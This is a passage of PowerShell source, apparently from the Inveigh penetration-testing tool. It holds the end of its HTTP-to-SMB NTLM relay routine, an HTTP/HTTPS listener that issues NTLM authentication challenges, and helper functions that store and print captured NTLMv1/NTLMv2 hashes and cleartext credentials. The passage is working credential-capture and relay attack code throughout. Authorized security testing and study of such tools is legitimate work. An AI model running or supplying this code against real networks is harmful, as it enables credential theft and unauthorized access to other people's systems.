                                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")])
                                        $inveigh.SMBRelay_failed_list.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $SMBRelayTarget")
                                        $inveigh.SMB_relay_active_step = 0
                                        $SMB_relay_socket.Close()
                                    }

                                }
                                else
                                {
                                    $inveigh.console_queue.Add("NTLMv1 SMB relay not yet supported")
                                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - NTLMv1 relay not yet supported")])
                                    $inveigh.SMB_relay_active_step = 0
                                    $SMB_relay_socket.Close()
                                }

                            }
                            else
                            {
                                $inveigh.console_queue.Add("Aborting SMB relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $SMBRelayTarget")
                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $SMBRelayTarget")])
                                $inveigh.SMB_relay_active_step = 0
                                $SMB_relay_socket.Close()
                            }

                        }
                        else
                        {
                            $inveigh.console_queue.Add("Aborting SMB relay since $HTTP_NTLM_user_string appears to be a machine account")
                            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_user_string appears to be a machine account")])
                            $inveigh.SMB_relay_active_step = 0
                            $SMB_relay_socket.Close()
                        }

                    }
                    else
                    {
                        $inveigh.console_queue.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on SMB relay username list")
                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on relay username list")])
                        $inveigh.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                    }

                }

            }
            else
            {
                $NTLM = 'NTLM'
            }
        
        }
        
        [Byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($inveigh.message)
        $inveigh.response.ContentLength64 = $HTTP_buffer.Length
        $inveigh.response.AddHeader("WWW-Authenticate",$NTLM)
        $HTTP_stream = $inveigh.response.OutputStream
        $HTTP_stream.Write($HTTP_buffer,0,$HTTP_buffer.Length)
        $HTTP_stream.close()
    }

    $inveigh.HTTP_listener.Stop()
    $inveigh.HTTP_listener.Close()
}

$control_relay_scriptblock = 
{
    param ($RunTime)

    if($RunTime)
    {    
        $control_timeout = New-TimeSpan -Minutes $RunTime
        $control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    }
       
    while ($inveigh.relay_running)
    {

        if($RunTime)
        {

            if($control_stopwatch.Elapsed -ge $control_timeout)
            {

                if($inveigh.HTTP_listener.IsListening)
                {
                    $inveigh.HTTP_listener.Stop()
                    $inveigh.HTTP_listener.Close()
                }
            
                $inveigh.console_queue.Add("Inveigh Relay exited due to run time at $(Get-Date -format 's')")
                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Relay exited due to run time")])
                Start-Sleep -m 5
                $inveigh.relay_running = $false

                if($inveigh.HTTPS)
                {
                    & "netsh" http delete sslcert ipport=0.0.0.0:443 > $null
        
                    try
                    {
                        $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                        $certificate_store.Open('ReadWrite')
                        $certificate = $certificate_store.certificates.Find("FindByThumbprint",$inveigh.certificate_thumbprint,$false)[0]
                        $certificate_store.Remove($certificate)
                        $certificate_store.Close()
                    }
                    catch
                    {

                        if($inveigh.status_output)
                        {
                            $inveigh.console_queue.Add("SSL Certificate Deletion Error - Remove Manually")
                        }

                        $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")

                        if($inveigh.file_output)
                        {
                            "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
                        }
                    
                    }
                
                }     

                $inveigh.HTTP = $false
                $inveigh.HTTPS = $false
            }

        }

        if($inveigh.file_output -and $inveigh.relay_file_output)
        {

            while($inveigh.log_file_queue.Count -gt 0)
            {
                $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append
                $inveigh.log_file_queue.RemoveAt(0)
            }

            while($inveigh.NTLMv1_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append
                $inveigh.NTLMv1_file_queue.RemoveAt(0)
            }

            while($inveigh.NTLMv2_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
                $inveigh.NTLMv2_file_queue.RemoveAt(0)
            }

            while($inveigh.cleartext_file_queue.Count -gt 0)
            {
                $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append
                $inveigh.cleartext_file_queue.RemoveAt(0)
            }
        
        }

        Start-Sleep -m 5
    }

 }

# HTTP/HTTPS Listener Startup function 
function HTTPListener()
{
    $inveigh.HTTP_listener = New-Object System.Net.HttpListener

    if($inveigh.HTTP)
    {
        $inveigh.HTTP_listener.Prefixes.Add('http://*:80/')
    }

    if($inveigh.HTTPS)
    {
        $inveigh.HTTP_listener.Prefixes.Add('https://*:443/')
    }

    $inveigh.HTTP_listener.AuthenticationSchemes = "Anonymous" 
    $inveigh.HTTP_listener.Start()
    $HTTP_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $HTTP_powershell = [PowerShell]::Create()
    $HTTP_powershell.Runspace = $HTTP_runspace
    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_challenge_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_response_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument(
        $SMBRelayTarget).AddArgument($SMBRelayCommand).AddArgument($SMBRelayUsernames).AddArgument(
        $SMBRelayAutoDisable).AddArgument($SMBRelayNetworkTimeout).AddArgument($WPADAuth) > $null
    $HTTP_powershell.BeginInvoke() > $null
}

# Control Relay Startup function
function ControlRelayLoop()
{
    $control_relay_runspace = [RunspaceFactory]::CreateRunspace()
    $control_relay_runspace.Open()
    $control_relay_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $control_relay_powershell = [PowerShell]::Create()
    $control_relay_powershell.Runspace = $control_relay_runspace
    $control_relay_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $control_relay_powershell.AddScript($control_relay_scriptblock).AddArgument($RunTime) > $null
    $control_relay_powershell.BeginInvoke() > $null
}

# HTTP Server Start
if($inveigh.HTTP -or $inveigh.HTTPS)
{
    HTTPListener
}

# Control Relay Loop Start
if($RunTime -or $inveigh.file_output)
{
    ControlRelayLoop
}

if($inveigh.console_output)
{

    :console_loop while($inveigh.relay_running -and $inveigh.console_output)
    {

        while($inveigh.console_queue.Count -gt 0)
        {

            if($inveigh.output_stream_only)
            {
                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                $inveigh.console_queue.RemoveAt(0)
            }
            else
            {

                switch -wildcard ($inveigh.console_queue[0])
                {

                    "* written to *"
                    {

                        if($inveigh.file_output)
                        {
                            Write-Warning $inveigh.console_queue[0]
                        }

                        $inveigh.console_queue.RemoveAt(0)
                    }

                    "* for relay *"
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    "*SMB relay *"
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    "* local administrator *"
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    default
                    {
                        Write-Output $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                }

            }

        }

        if($inveigh.console_input)
        {

            if([Console]::KeyAvailable)
            {
                $inveigh.console_output = $false
                BREAK console_loop
            }
        
        }

        Start-Sleep -m 5
    }

}

}
#End Invoke-InveighRelay

function Stop-Inveigh
{
<#
.SYNOPSIS
Stop-Inveigh will stop all running Inveigh functions.
#>

if($inveigh)
{

    if($inveigh.running -or $inveigh.relay_running -or $inveigh.unprivileged_running)
    {

        if($inveigh.HTTP_listener.IsListening)
        {
            $inveigh.HTTP_listener.Stop()
            $inveigh.HTTP_listener.Close()
        }
            
        if($inveigh.unprivileged_running)
        {
            $inveigh.unprivileged_running = $false
            Start-Sleep -s 5
            Write-Output("Inveigh Unprivileged exited at $(Get-Date -format 's')")
            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Unprivileged exited")  > $null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - Inveigh Unprivileged exited" | Out-File $Inveigh.log_out_file -Append
            }

        }
            
        if($inveigh.relay_running)
        {
            $inveigh.relay_running = $false
            Write-Output("Inveigh Relay exited at $(Get-Date -format 's')")
            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Relay exited")  > $null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - Inveigh Relay exited" | Out-File $Inveigh.log_out_file -Append
            }

        } 

        if($inveigh.running)
        {
            $inveigh.running = $false
            Write-Output("Inveigh exited at $(Get-Date -format 's')")
            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh exited")  > $null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - Inveigh exited" | Out-File $Inveigh.log_out_file -Append
            }

        } 

    }
    else
    {
        Write-Output("There are no running Inveigh functions")
    }
    
    if($inveigh.HTTPS)
    {
        & "netsh" http delete sslcert ipport=0.0.0.0:443 > $null

        try
        {
            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
            $certificate_store.Open('ReadWrite')
            $certificate = $certificate_store.certificates.Find("FindByThumbprint",$inveigh.certificate_thumbprint,$FALSE)[0]
            $certificate_store.Remove($certificate)
            $certificate_store.Close()
        }
        catch
        {
            Write-Output("SSL Certificate Deletion Error - Remove Manually")
            $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")  > $null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
            }

        }
    }

    $inveigh.HTTP = $false
    $inveigh.HTTPS = $false
}
else
{
    Write-Output("There are no running Inveigh functions")|Out-Null
}

} 

function Get-Inveigh
{
<#
.SYNOPSIS
Get-Inveigh will get stored Inveigh data from memory.

.PARAMETER Console
Get queued console output. This is also the default if no parameters are set. 

.PARAMETER Log
Get log entries.

.PARAMETER NTLMv1
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv1Unique
Get the first captured NTLMv1 challenge/response for each unique account.

.PARAMETER NTLMv1Usernames
Get IP addresses and usernames for captured NTLMv2 challenge/response hashes.

.PARAMETER NTLMv2
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv2Unique
Get the first captured NTLMv2 challenge/response for each unique account.

.PARAMETER NTLMv2Usernames
Get IP addresses and usernames for captured NTLMv2 challenge/response hashes.

.PARAMETER Cleartext
Get captured cleartext credentials.

.PARAMETER CleartextUnique
Get unique captured cleartext credentials.

.PARAMETER Learning
Get valid hosts discovered through spoofer learning.
#>

[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Switch]$Console,
    [parameter(Mandatory=$false)][Switch]$Log,
    [parameter(Mandatory=$false)][Switch]$NTLMv1,
    [parameter(Mandatory=$false)][Switch]$NTLMv2,
    [parameter(Mandatory=$false)][Switch]$NTLMv1Unique,
    [parameter(Mandatory=$false)][Switch]$NTLMv2Unique,
    [parameter(Mandatory=$false)][Switch]$NTLMv1Usernames,
    [parameter(Mandatory=$false)][Switch]$NTLMv2Usernames,
    [parameter(Mandatory=$false)][Switch]$Cleartext,
    [parameter(Mandatory=$false)][Switch]$CleartextUnique,
    [parameter(Mandatory=$false)][Switch]$Learning,
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if($Console -or $PSBoundParameters.Count -eq 0)
{

    while($inveigh.console_queue.Count -gt 0)
    {

        if($inveigh.output_stream_only)
        {
            Write-Output($inveigh.console_queue[0] + $inveigh.newline)
            $inveigh.console_queue.RemoveAt(0)
        }
        else
        {

            switch -wildcard ($inveigh.console_queue[0])
            {

                "* written to *"
                {

                    if($inveigh.file_output)
                    {
                        Write-Warning $inveigh.console_queue[0]
                    }

                    $inveigh.console_queue.RemoveAt(0)
                }

                "* for relay *"
                {
                    Write-Warning $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveAt(0)
                }

                "*SMB relay *"
                {
                    Write-Warning $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveAt(0)
                }

                "* local administrator *"
                {
                    Write-Warning $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveAt(0)
                }

                default
                {
                    Write-Output $inveigh.console_queue[0]
                    $inveigh.console_queue.RemoveAt(0)
                }

            }

        }
         
    }

}

if($Log)
{
    Write-Output $inveigh.log
}

if($NTLMv1)
{
    Write-Output $inveigh.NTLMv1_list
}

if($NTLMv1Unique)
{
    $inveigh.NTLMv1_list.Sort()

    foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
    {
        $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))

        if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
        {
            Write-Output $unique_NTLMv1
        }

        $unique_NTLMv1_account_last = $unique_NTLMv1_account
    }

}

if($NTLMv1Usernames)
{
    Write-Output $inveigh.NTLMv2_username_list
}

if($NTLMv2)
{
    Write-Output $inveigh.NTLMv2_list
}

if($NTLMv2Unique)
{
    $inveigh.NTLMv2_list.Sort()

    foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
    {
        $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))

        if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
        {
            Write-Output $unique_NTLMv2
        }

        $unique_NTLMv2_account_last = $unique_NTLMv2_account
    }

}

if($NTLMv2Usernames)
{
    Write-Output $inveigh.NTLMv2_username_list
}

if($Cleartext)
{
    Write-Output $inveigh.cleartext_list
}

if($CleartextUnique)
{
    Write-Output $inveigh.cleartext_list | Get-Unique
}

if($Learning)
{
    Write-Output $inveigh.valid_host_list
}

}

function Watch-Inveigh
{
<#
.SYNOPSIS
Watch-Inveigh will enabled real time console output. If using this function through a shell, test to ensure that it doesn't hang the shell.
#>

if($inveigh.tool -ne 1)
{

    if($inveigh.running -or $inveigh.relay_running -or $inveigh.unprivileged_running)
    {
        Write-Output "Press any key to stop real time console output"
        $inveigh.console_output = $true

        :console_loop while((($inveigh.running -or $inveigh.relay_running -or $inveigh.unprivileged_running) -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
        {

            while($inveigh.console_queue.Count -gt 0)
            {

                if($inveigh.output_stream_only)
                {
                    Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                    $inveigh.console_queue.RemoveAt(0)
                }
                else
                {

                    switch -wildcard ($inveigh.console_queue[0])
                    {
                          
                        "* written to *"
                        {

                            if($inveigh.file_output)
                            {
                                Write-Warning $inveigh.console_queue[0]
                            }

                            $inveigh.console_queue.RemoveAt(0)
                        }

                        "* for relay *"
                        {
                            Write-Warning $inveigh.console_queue[0]
                            $inveigh.console_queue.RemoveAt(0)
                        }

                        "*SMB relay *"
                        {
                            Write-Warning $inveigh.console_queue[0]
                            $inveigh.console_queue.RemoveAt(0)
                        }

                        "* local administrator *"
                        {
                            Write-Warning $inveigh.console_queue[0]
                            $inveigh.console_queue.RemoveAt(0)
                        }

                        default
                        {
                            Write-Output $inveigh.console_queue[0]
                            $inveigh.console_queue.RemoveAt(0)
                        }

                    }

                }
                             
            }

            if([Console]::KeyAvailable)
            {
                $inveigh.console_output = $false
                BREAK console_loop
            }

            Start-Sleep -m 5
        }

    }
    else
    {
        Write-Output "Inveigh isn't running"
    }

}
else
{
    Write-Output "Watch-Inveigh cannot be used with current external tool selection"
}

}

function Clear-Inveigh
{
<#
.SYNOPSIS
Clear-Inveigh will clear Inveigh data from memory.
#>

if($inveigh)
{

    if(!$inveigh.running -and !$inveigh.relay_running -and !$inveigh.unprivileged_running)
    {
        Remove-Variable inveigh -scope global
        Write-Output "Inveigh data has been cleared from memory"
    }
    else
    {
        Write-Output "Run Stop-Inveigh before running Clear-Inveigh"
    }

}

}